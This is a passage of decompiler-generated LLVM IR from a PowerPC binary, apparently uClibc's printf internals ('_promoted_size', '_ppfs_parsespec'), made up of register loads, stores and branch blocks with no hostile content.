  %v1_10003fec = trunc i32 %v2_10003fe8 to i8
  store i8 %v1_10003fec, i8* %v2_10003fdc, align 1
  %v0_10003ff0 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10003ff0, label %dec_label_pc_10004010, label %dec_label_pc_10003ff4

dec_label_pc_10003ff4:                            ; preds = %dec_label_pc_10003fdc
  %v0_10003ff4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003ff4 = urem i32 %v0_10003ff4, 256
  store i32 %v1_10003ff4, i32* %r9.global-to-local, align 4
  %v0_10003ff8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003ff8 = add i32 %v0_10003ff8, 8
  %v2_10003ff8 = inttoptr i32 %v1_10003ff8 to i32*
  %v3_10003ff8 = load i32, i32* %v2_10003ff8, align 4
  %v1_10003ffc = mul nuw nsw i32 %v1_10003ff4, 4
  store i32 %v1_10003ffc, i32* %r0.global-to-local, align 4
  %v1_10004000 = add nuw nsw i32 %v1_10003ff4, 2
  store i32 %v1_10004000, i32* %r9.global-to-local, align 4
  %v2_10004004 = add i32 %v3_10003ff8, %v1_10003ffc
  store i32 %v2_10004004, i32* %r11.global-to-local, align 4
  %v1_10004008 = trunc i32 %v1_10004000 to i8
  %v2_10004008 = load i32, i32* @r3, align 4
  %v3_10004008 = add i32 %v2_10004008, 76
  %v4_10004008 = inttoptr i32 %v3_10004008 to i8*
  store i8 %v1_10004008, i8* %v4_10004008, align 1
  br label %dec_label_pc_10004024

dec_label_pc_10004010:                            ; preds = %dec_label_pc_10003fdc
  %v0_10004010 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004010 = add i32 %v0_10004010, 4
  %v2_10004010 = inttoptr i32 %v1_10004010 to i32*
  %v3_10004010 = load i32, i32* %v2_10004010, align 4
  %v1_10004014 = add i32 %v3_10004010, 7
  store i32 %v1_10004014, i32* %r9.global-to-local, align 4
  %v1_10004018 = call i32 @__asm_rlwinm(i32 %v1_10004014, i32 0, i32 0, i32 28)
  store i32 %v1_10004018, i32* %r11.global-to-local, align 4
  %v1_1000401c = add i32 %v1_10004018, 8
  store i32 %v1_1000401c, i32* %r0.global-to-local, align 4
  %v1_10004020 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004020 = add i32 %v1_10004020, 4
  %v3_10004020 = inttoptr i32 %v2_10004020 to i32*
  store i32 %v1_1000401c, i32* %v3_10004020, align 4
  br label %dec_label_pc_10004024

dec_label_pc_10004024:                            ; preds = %dec_label_pc_10003ff4, %dec_label_pc_10004010
  %v0_10004024 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004024 = inttoptr i32 %v0_10004024 to i32*
  %v2_10004024 = load i32, i32* %v1_10004024, align 4
  store i32 %v2_10004024, i32* %r9.global-to-local, align 4
  %v1_10004028 = add i32 %v0_10004024, 4
  %v2_10004028 = inttoptr i32 %v1_10004028 to i32*
  %v3_10004028 = load i32, i32* %v2_10004028, align 4
  store i32 %v3_10004028, i32* %r10.global-to-local, align 4
  %v1_1000402c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000402c = inttoptr i32 %v1_1000402c to i32*
  store i32 %v2_10004024, i32* %v2_1000402c, align 4
  %v0_10004030 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004030 = load i32, i32* %r8.global-to-local, align 4
  %v2_10004030 = add i32 %v1_10004030, 4
  %v3_10004030 = inttoptr i32 %v2_10004030 to i32*
  store i32 %v0_10004030, i32* %v3_10004030, align 4
  br label %dec_label_pc_100040bc

dec_label_pc_10004038:                            ; preds = %dec_label_pc_10003fd0, %dec_label_pc_10003fd4
  store i32 %v1_10003fa0, i32* %r10.global-to-local, align 4
  %v1_1000403c = add i32 %v2_100040a0, 77
  %v2_1000403c = inttoptr i32 %v1_1000403c to i8*
  %v3_1000403c = load i8, i8* %v2_1000403c, align 1
  %v4_1000403c = zext i8 %v3_1000403c to i32
  store i32 %v4_1000403c, i32* %r11.global-to-local, align 4
  %v2_10004040 = icmp ugt i8 %v3_1000403c, 8
  store i1 %v2_10004040, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000403c, 7
  br i1 %tmp25, label %dec_label_pc_10004064, label %dec_label_pc_10004048

dec_label_pc_10004048:                            ; preds = %dec_label_pc_10004038
  %v1_10004048 = add i32 %v2_100040a0, 84
  %v2_10004048 = inttoptr i32 %v1_10004048 to i32*
  %v3_10004048 = load i32, i32* %v2_10004048, align 4
  %v1_1000404c = mul nuw nsw i32 %v4_1000403c, 8
  %v1_10004050 = add nuw nsw i32 %v1_1000404c, 32
  %v2_10004054 = add i32 %v1_10004050, %v3_10004048
  store i32 %v2_10004054, i32* %r9.global-to-local, align 4
  %v1_10004058 = add nuw nsw i32 %v4_1000403c, 1
  store i32 %v1_10004058, i32* %r0.global-to-local, align 4
  %v1_1000405c = trunc i32 %v1_10004058 to i8
  store i8 %v1_1000405c, i8* %v2_1000403c, align 1
  br label %dec_label_pc_100040bc

dec_label_pc_10004064:                            ; preds = %dec_label_pc_10004038
  %v1_10004064 = add i32 %v2_100040a0, 80
  %v2_10004064 = inttoptr i32 %v1_10004064 to i32*
  %v3_10004064 = load i32, i32* %v2_10004064, align 4
  %v1_10004068 = add i32 %v3_10004064, 7
  store i32 %v1_10004068, i32* %r9.global-to-local, align 4
  %v1_1000406c = call i32 @__asm_rlwinm(i32 %v1_10004068, i32 0, i32 0, i32 28)
  store i32 %v1_1000406c, i32* %r9.global-to-local, align 4
  %v1_10004070 = add i32 %v1_1000406c, 8
  store i32 %v1_10004070, i32* %r0.global-to-local, align 4
  %v1_10004074 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004074 = add i32 %v1_10004074, 4
  %v3_10004074 = inttoptr i32 %v2_10004074 to i32*
  store i32 %v1_10004070, i32* %v3_10004074, align 4
  br label %dec_label_pc_100040bc

dec_label_pc_10004084:                            ; preds = %dec_label_pc_10003fd0, %dec_label_pc_10003fd4, %dec_label_pc_10003fbc, %dec_label_pc_10003fa8
  %v2_10004084 = inttoptr i32 %v1_10003fa0 to i8*
  %v3_10004084 = load i8, i8* %v2_10004084, align 1
  %v4_10004084 = zext i8 %v3_10004084 to i32
  store i32 %v4_10004084, i32* %r11.global-to-local, align 4
  %v2_10004088 = icmp ugt i8 %v3_10004084, 8
  store i1 %v2_10004088, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_10004084, 7
  br i1 %tmp26, label %dec_label_pc_100040a8, label %dec_label_pc_10004090

dec_label_pc_10004090:                            ; preds = %dec_label_pc_10004084
  %v1_10004090 = add i32 %v2_100040a0, 84
  %v2_10004090 = inttoptr i32 %v1_10004090 to i32*
  %v3_10004090 = load i32, i32* %v2_10004090, align 4
  %v1_10004094 = mul nuw nsw i32 %v4_10004084, 4
  %v2_10004098 = add i32 %v3_10004090, %v1_10004094
  store i32 %v2_10004098, i32* %r9.global-to-local, align 4
  %v1_1000409c = add nuw nsw i32 %v4_10004084, 1
  store i32 %v1_1000409c, i32* %r0.global-to-local, align 4
  %v1_100040a0 = trunc i32 %v1_1000409c to i8
  store i8 %v1_100040a0, i8* %v2_10004084, align 1
  br label %dec_label_pc_100040b4

dec_label_pc_100040a8:                            ; preds = %dec_label_pc_10004084
  %v1_100040a8 = add i32 %v2_100040a0, 80
  %v2_100040a8 = inttoptr i32 %v1_100040a8 to i32*
  %v3_100040a8 = load i32, i32* %v2_100040a8, align 4
  store i32 %v3_100040a8, i32* %r9.global-to-local, align 4
  %v1_100040ac = add i32 %v3_100040a8, 4
  store i32 %v1_100040ac, i32* %r0.global-to-local, align 4
  store i32 %v1_100040ac, i32* %v2_100040a8, align 4
  br label %dec_label_pc_100040b4

dec_label_pc_100040b4:                            ; preds = %dec_label_pc_10004090, %dec_label_pc_100040a8
  %v0_100040b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100040b4 = inttoptr i32 %v0_100040b4 to i32*
  %v2_100040b4 = load i32, i32* %v1_100040b4, align 4
  store i32 %v2_100040b4, i32* %r0.global-to-local, align 4
  %v1_100040b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100040b8 = inttoptr i32 %v1_100040b8 to i32*
  store i32 %v2_100040b4, i32* %v2_100040b8, align 4
  br label %dec_label_pc_100040bc

dec_label_pc_100040bc:                            ; preds = %dec_label_pc_10004064, %dec_label_pc_10004048, %dec_label_pc_10004024, %dec_label_pc_100040b4
  %v0_100040bc = load i32, i32* %r8.global-to-local, align 4
  %v1_100040bc = add i32 %v0_100040bc, 8
  store i32 %v1_100040bc, i32* %r8.global-to-local, align 4
  %v0_100040c0.pre = load i32, i32* @r7, align 4
  %v0_100040c4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100040c0

dec_label_pc_100040c0:                            ; preds = %dec_label_pc_10003f8c, %dec_label_pc_100040bc
  %v0_100040c4 = phi i32 [ %v2_100040a0, %dec_label_pc_10003f8c ], [ %v0_100040c4.pre, %dec_label_pc_100040bc ]
  %v0_100040c0 = phi i32 [ %v0_10003f8c, %dec_label_pc_10003f8c ], [ %v0_100040c0.pre, %dec_label_pc_100040bc ]
  %v1_100040c0 = add i32 %v0_100040c0, 1
  store i32 %v1_100040c0, i32* @r7, align 4
  %v1_100040c4 = add i32 %v0_100040c4, 28
  %v2_100040c4 = inttoptr i32 %v1_100040c4 to i32*
  %v3_100040c4 = load i32, i32* %v2_100040c4, align 4
  store i32 %v3_100040c4, i32* %r0.global-to-local, align 4
  %v2_100040c8 = icmp slt i32 %v1_100040c0, %v3_100040c4
  %v3_100040c8 = icmp sgt i32 %v1_100040c0, %v3_100040c4
  store i1 %v3_100040c8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100040c8, label %dec_label_pc_10003f8c, label %dec_label_pc_10004114

dec_label_pc_100040d4:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_100040d8 = icmp ne i32 %v3_10003edc, -2147483648
  %v4_100040d8 = icmp eq i32 %v3_10003edc, -2147483648
  store i1 %v3_100040d8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_100040d8, label %dec_label_pc_100040e0, label %dec_label_pc_100040f4

dec_label_pc_100040e0:                            ; preds = %dec_label_pc_100040d4
  %v1_100040e0 = add i32 %v0_10003ed4, 36
  %v2_100040e0 = inttoptr i32 %v1_100040e0 to i8*
  %v3_100040e0 = load i8, i8* %v2_100040e0, align 1
  %v4_100040e0 = zext i8 %v3_100040e0 to i32
  %v1_100040e4 = mul nuw nsw i32 %v4_100040e0, 8
  %v2_100040e8 = add i32 %v1_100040e4, %v1_10003ed8
  store i32 %v2_100040e8, i32* %r9.global-to-local, align 4
  %v1_100040ec = add i32 %v2_100040e8, -8
  %v2_100040ec = inttoptr i32 %v1_100040ec to i32*
  %v3_100040ec = load i32, i32* %v2_100040ec, align 4
  store i32 %v3_100040ec, i32* %r0.global-to-local, align 4
  store i32 %v3_100040ec, i32* %v2_10003edc, align 4
  %v0_100040f4.pre = load i32, i32* @r3, align 4
  %v1_100040f8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100040f4

dec_label_pc_100040f4:                            ; preds = %dec_label_pc_100040d4, %dec_label_pc_100040e0
  %v1_100040f8 = phi i32 [ -2147483648, %dec_label_pc_100040d4 ], [ %v1_100040f8.pre, %dec_label_pc_100040e0 ]
  %v1_10004110 = phi i32 [ %v0_10003ed4, %dec_label_pc_100040d4 ], [ %v0_100040f4.pre, %dec_label_pc_100040e0 ]
  %v1_100040f4 = add i32 %v1_10004110, 4
  %v2_100040f4 = inttoptr i32 %v1_100040f4 to i32*
  %v3_100040f4 = load i32, i32* %v2_100040f4, align 4
  store i32 %v3_100040f4, i32* %r0.global-to-local, align 4
  %v3_100040f8 = icmp sgt i32 %v3_100040f4, %v1_100040f8
  %v4_100040f8 = icmp eq i32 %v3_100040f4, %v1_100040f8
  store i1 %v3_100040f8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_100040f8, label %dec_label_pc_10004100, label %dec_label_pc_10004114

dec_label_pc_10004100:                            ; preds = %dec_label_pc_100040f4
  %v1_10004100 = add i32 %v1_10004110, 37
  %v2_10004100 = inttoptr i32 %v1_10004100 to i8*
  %v3_10004100 = load i8, i8* %v2_10004100, align 1
  %v4_10004100 = zext i8 %v3_10004100 to i32
  %v1_10004104 = mul nuw nsw i32 %v4_10004100, 8
  %v1_10004108 = load i32, i32* %r8.global-to-local, align 4
  %v2_10004108 = add i32 %v1_10004104, %v1_10004108
  store i32 %v2_10004108, i32* %r9.global-to-local, align 4
  %v1_1000410c = add i32 %v2_10004108, -8
  %v2_1000410c = inttoptr i32 %v1_1000410c to i32*
  %v3_1000410c = load i32, i32* %v2_1000410c, align 4
  store i32 %v3_1000410c, i32* %r0.global-to-local, align 4
  store i32 %v3_1000410c, i32* %v2_100040f4, align 4
  %v0_10004114.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10004114

dec_label_pc_10004114:                            ; preds = %dec_label_pc_100040c0, %dec_label_pc_100040c4.preheader, %dec_label_pc_100040f4, %dec_label_pc_10004100
  %v0_10004114 = phi i32 [ %v1_10004110, %dec_label_pc_100040f4 ], [ %v0_10004114.pre, %dec_label_pc_10004100 ], [ %v0_100040c45, %dec_label_pc_100040c4.preheader ], [ %v0_100040c4, %dec_label_pc_100040c0 ]
  %v1_10004114 = add i32 %v0_10004114, 8
  %v2_10004114 = inttoptr i32 %v1_10004114 to i32*
  %v3_10004114 = load i32, i32* %v2_10004114, align 4
  store i32 %v3_10004114, i32* %r11.global-to-local, align 4
  %v2_10004118 = icmp sgt i32 %v3_10004114, 0
  store i1 %v2_10004118, i1* %cr7_gt.global-to-local, align 1
  %v0_1000411c = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_10004114, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000411c)
  %v0_10004120 = load i32, i32* @r3, align 4
  %v1_10004120 = add i32 %v0_10004120, 16
  %v2_10004120 = inttoptr i32 %v1_10004120 to i32*
  %v3_10004120 = load i32, i32* %v2_10004120, align 4
  store i32 %v3_10004120, i32* %r0.global-to-local, align 4
  %v0_10004124 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004124 = sub i32 0, %v0_10004124
  store i32 %v1_10004124, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000412c = add i32 %v0_10004120, 8
  %v3_1000412c = inttoptr i32 %v2_1000412c to i32*
  store i32 %v1_10004124, i32* %v3_1000412c, align 4
  %v0_10004130 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004130 = or i32 %v0_10004130, 8
  store i32 %v1_10004130, i32* %r0.global-to-local, align 4
  %v0_10004134 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004134 = load i32, i32* @r3, align 4
  %v2_10004134 = add i32 %v1_10004134, 20
  %v3_10004134 = inttoptr i32 %v2_10004134 to i32*
  store i32 %v0_10004134, i32* %v3_10004134, align 4
  %v1_10004138 = call i32 @__asm_rlwinm(i32 %v1_10004130, i32 0, i32 0, i32 30)
  store i32 %v1_10004138, i32* %r0.global-to-local, align 4
  %v1_1000413c = load i32, i32* @r3, align 4
  %v2_1000413c = add i32 %v1_1000413c, 16
  %v3_1000413c = inttoptr i32 %v2_1000413c to i32*
  store i32 %v1_10004138, i32* %v3_1000413c, align 4
  %v0_10004140 = load i32, i32* @r3, align 4
  ret i32 %v0_10004140

; uselistorder directives
  uselistorder i32 %v3_100040f4, { 1, 0, 2 }
  uselistorder i32 %v1_100040f8, { 1, 0 }
  uselistorder i32 %v3_100040c4, { 1, 0, 2 }
  uselistorder i32 %v1_100040c0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100040c4, { 0, 2, 1 }
  uselistorder i32 %v4_1000403c, { 1, 0, 2 }
  uselistorder i32 %v1_10003ffc, { 1, 0 }
  uselistorder i32 %v1_10003ff4, { 2, 0, 1 }
  uselistorder i32 %v1_10003fa0, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10003f94, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10003f8c, { 1, 0 }
  uselistorder i32 %v2_100040a0, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100040c45, { 1, 0, 2 }
  uselistorder i32 %v3_10003f34, { 1, 0, 2 }
  uselistorder i32 %v2_10003f64, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_10003edc, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10003ed4, { 1, 0, 2 }
  uselistorder i32 %v0_10003ed4, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 1, 19, 9, 10, 11, 12, 0, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_10004114, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100040f4, { 1, 0 }
  uselistorder label %dec_label_pc_100040c0, { 1, 0 }
  uselistorder label %dec_label_pc_100040bc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100040b4, { 1, 0 }
  uselistorder label %dec_label_pc_10004084, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10004038, { 1, 0 }
  uselistorder label %dec_label_pc_10004024, { 1, 0 }
  uselistorder label %dec_label_pc_10003f8c, { 1, 0 }
  uselistorder label %dec_label_pc_100040c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003f78, { 1, 0 }
  uselistorder label %dec_label_pc_10003f34, { 1, 0 }
  uselistorder label %dec_label_pc_10003f28, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_10004150

dec_label_pc_10004150:                            ; preds = %dec_label_pc_10004150, %entry
  %v0_10004150 = phi i32 [ ptrtoint (i32* @global_var_1000bd5c.362 to i32), %entry ], [ %v1_10004150, %dec_label_pc_10004150 ]
  %v1_10004150 = add i32 %v0_10004150, -2
  %v2_10004150 = inttoptr i32 %v1_10004150 to i16*
  %v3_10004150 = load i16, i16* %v2_10004150, align 2
  %v4_10004150 = sext i16 %v3_10004150 to i32
  %v4_10004154 = icmp eq i32 %v4_10004150, %arg1
  %v3_10004158.not = icmp ule i32 %v1_10004150, ptrtoint (i32* @global_var_1000bd44.363 to i32)
  %brmerge = or i1 %v4_10004154, %v3_10004158.not
  br i1 %brmerge, label %dec_label_pc_10004164, label %dec_label_pc_10004150

dec_label_pc_10004164:                            ; preds = %dec_label_pc_10004150
  %v2_1000416c = sub i32 %v1_10004150, ptrtoint (i32* @global_var_1000bd44.363 to i32)
  %v1_10004174 = udiv i32 %v2_1000416c, 2
  %v2_10004174 = and i32 %v2_1000416c, -2147483648
  %v3_10004174 = or i32 %v1_10004174, %v2_10004174
  %v2_1000417c = add i32 %v3_10004174, ptrtoint (i32* @global_var_1000bd5c.362 to i32)
  %v3_1000417c = inttoptr i32 %v2_1000417c to i8*
  %v4_1000417c = load i8, i8* %v3_1000417c, align 1
  %v5_1000417c = zext i8 %v4_1000417c to i32
  ret i32 %v5_1000417c

; uselistorder directives
  uselistorder i32 %v2_1000416c, { 1, 0 }
  uselistorder i32 %v1_10004150, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1000bd44.363 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000bd5c.362 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10004184 = load i32, i32* @lr, align 4
  store i32 %v0_10004184, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000419c = add i32 %tmp, 16
  %v2_1000419c = inttoptr i32 %v1_1000419c to i32*
  %v3_1000419c = load i32, i32* %v2_1000419c, align 4
  %v1_100041a4 = and i32 %v3_1000419c, 128
  store i32 %v1_100041a4, i32* %r6.global-to-local, align 4
  %v3_100041a4 = icmp eq i32 %v1_100041a4, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100041b8 = add i32 %tmp, 24
  %v2_100041b8 = inttoptr i32 %v1_100041b8 to i32*
  %v3_100041b8 = load i32, i32* %v2_100041b8, align 4
  store i32 %v3_100041b8, i32* @r26, align 4
  br i1 %v3_100041a4, label %dec_label_pc_100041c0, label %dec_label_pc_100041d8

dec_label_pc_100041c0:                            ; preds = %entry
  %v2_100041c0 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000422c

dec_label_pc_100041d0:                            ; preds = %dec_label_pc_10004400
  %v1_100041d0 = add i32 %v0_100043d0, 1
  store i32 %v1_100041d0, i32* @r30, align 4
  br label %dec_label_pc_10004418

dec_label_pc_100041d8:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_100041dc = load i32, i32* %arg1, align 4
  store i32 %v2_100041dc, i32* %r8.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_100041e8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100041e8, i32* @r7, align 4
  br label %dec_label_pc_100041ec

dec_label_pc_100041ec:                            ; preds = %dec_label_pc_1000421c.dec_label_pc_100041ec_crit_edge, %dec_label_pc_100041d8
  %v0_100041f4 = phi i32 [ %v0_100041f4.pre, %dec_label_pc_1000421c.dec_label_pc_100041ec_crit_edge ], [ %v2_100041dc, %dec_label_pc_100041d8 ]
  %v0_100041f0 = phi i32 [ %v0_100041f0.pre, %dec_label_pc_1000421c.dec_label_pc_100041ec_crit_edge ], [ %v2_100041e8, %dec_label_pc_100041d8 ]
  %v0_100041f8 = phi i32 [ %v0_100041ec.pre, %dec_label_pc_1000421c.dec_label_pc_100041ec_crit_edge ], [ 0, %dec_label_pc_100041d8 ]
  %v1_100041ec = mul i32 %v0_100041f8, 4
  %v2_100041f0 = add i32 %v0_100041f8, %v0_100041f0
  store i32 %v2_100041f0, i32* %r9.global-to-local, align 4
  %v2_100041f4 = add i32 %v1_100041ec, %v0_100041f4
  store i32 %v2_100041f4, i32* %r11.global-to-local, align 4
  %v1_100041f8 = add i32 %v0_100041f8, 1
  store i32 %v1_100041f8, i32* %r10.global-to-local, align 4
  %v1_100041fc = add i32 %v2_100041f4, -4
  %v2_100041fc = inttoptr i32 %v1_100041fc to i32*
  %v3_100041fc = load i32, i32* %v2_100041fc, align 4
  store i32 %v3_100041fc, i32* %r0.global-to-local, align 4
  %v1_10004200 = trunc i32 %v3_100041fc to i8
  %v3_10004200 = add i32 %v2_100041f0, 24
  %v4_10004200 = inttoptr i32 %v3_10004200 to i8*
  store i8 %v1_10004200, i8* %v4_10004200, align 1
  %v0_10004204 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004204 = urem i32 %v0_10004204, 256
  store i32 %v1_10004204, i32* %r0.global-to-local, align 4
  %v0_1000420c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000420c = add i32 %v0_1000420c, -4
  %v2_1000420c = inttoptr i32 %v1_1000420c to i32*
  %v3_1000420c = load i32, i32* %v2_1000420c, align 4
  store i32 %v3_1000420c, i32* %r9.global-to-local, align 4
  %v4_10004210 = icmp eq i32 %v1_10004204, %v3_1000420c
  br i1 %v4_10004210, label %dec_label_pc_10004218, label %dec_label_pc_10004688

dec_label_pc_10004218:                            ; preds = %dec_label_pc_100041ec
  %v3_10004208 = icmp eq i32 %v1_10004204, 0
  br i1 %v3_10004208, label %dec_label_pc_10004220, label %dec_label_pc_1000421c

dec_label_pc_1000421c:                            ; preds = %dec_label_pc_10004218
  %v0_1000421c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000421c = add i32 %v0_1000421c, -1
  store i32 %v1_1000421c, i32* %ctr.global-to-local, align 4
  %v2_1000421c = icmp eq i32 %v1_1000421c, 0
  br i1 %v2_1000421c, label %dec_label_pc_10004220, label %dec_label_pc_1000421c.dec_label_pc_100041ec_crit_edge

dec_label_pc_1000421c.dec_label_pc_100041ec_crit_edge: ; preds = %dec_label_pc_1000421c
  %v0_100041ec.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_100041f0.pre = load i32, i32* @r7, align 4
  %v0_100041f4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100041ec

dec_label_pc_10004220:                            ; preds = %dec_label_pc_1000421c, %dec_label_pc_10004218
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10004224 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000422c

dec_label_pc_1000422c:                            ; preds = %dec_label_pc_100041c0, %dec_label_pc_10004220
  %v2_1000423c.pre-phi = phi i32 [ %.pre, %dec_label_pc_100041c0 ], [ %v2_100041e8, %dec_label_pc_10004220 ]
  %storemerge3 = phi i32 [ %v2_100041c0, %dec_label_pc_100041c0 ], [ %v2_10004224, %dec_label_pc_10004220 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268500992, i32* @r27, align 4
  store i32 %v2_1000423c.pre-phi, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000424c

dec_label_pc_10004248:                            ; preds = %dec_label_pc_10004358, %dec_label_pc_100043dc
  %v0_10004248 = phi i32 [ %v1_100043dc, %dec_label_pc_100043dc ], [ %v0_10004340, %dec_label_pc_10004358 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_100043dc ], [ %stack_var_-84.2, %dec_label_pc_10004358 ]
  store i32 %v0_10004248, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000424c

dec_label_pc_1000424c:                            ; preds = %dec_label_pc_1000422c, %dec_label_pc_10004248
  %v0_10004260 = phi i32 [ %storemerge3, %dec_label_pc_1000422c ], [ %v0_10004248, %dec_label_pc_10004248 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000422c ], [ %stack_var_-84.0, %dec_label_pc_10004248 ]
  %v1_1000424c = inttoptr i32 %v0_10004260 to i8*
  %v2_1000424c = load i8, i8* %v1_1000424c, align 1
  %v3_1000424c = zext i8 %v2_1000424c to i32
  store i32 %v3_1000424c, i32* %r0.global-to-local, align 4
  store i32 %v0_10004260, i32* @r30, align 4
  %v3_10004254 = icmp eq i8 %v2_1000424c, 42
  br i1 %v3_10004254, label %dec_label_pc_1000425c, label %dec_label_pc_1000426c

dec_label_pc_1000425c:                            ; preds = %dec_label_pc_1000424c
  %v0_1000425c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000425c = mul i32 %v0_1000425c, -4
  store i32 %v1_1000425c, i32* %r0.global-to-local, align 4
  %v1_10004260 = add i32 %v0_10004260, 1
  store i32 %v1_10004260, i32* @r30, align 4
  %v0_10004264 = load i32, i32* @r1, align 4
  %v2_10004264 = add i32 %v0_10004264, %v1_1000425c
  store i32 %v2_10004264, i32* %r9.global-to-local, align 4
  %v0_10004268 = load i32, i32* @r29, align 4
  %v2_10004268 = add i32 %v2_10004264, 8
  %v3_10004268 = inttoptr i32 %v2_10004268 to i32*
  store i32 %v0_10004268, i32* %v3_10004268, align 4
  %v0_10004284.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000426c

dec_label_pc_1000426c:                            ; preds = %dec_label_pc_1000424c, %dec_label_pc_1000425c
  %v0_10004284.pre = phi i32 [ %v0_10004260, %dec_label_pc_1000424c ], [ %v0_10004284.pre.pre, %dec_label_pc_1000425c ]
  %v0_1000426c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000426c = add i32 %v0_1000426c, -10232
  %v2_1000426c = inttoptr i32 %v1_1000426c to i32*
  %v3_1000426c = load i32, i32* %v2_1000426c, align 4
  store i32 %v3_1000426c, i32* @r7, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10004284

dec_label_pc_10004278:                            ; preds = %dec_label_pc_10004284
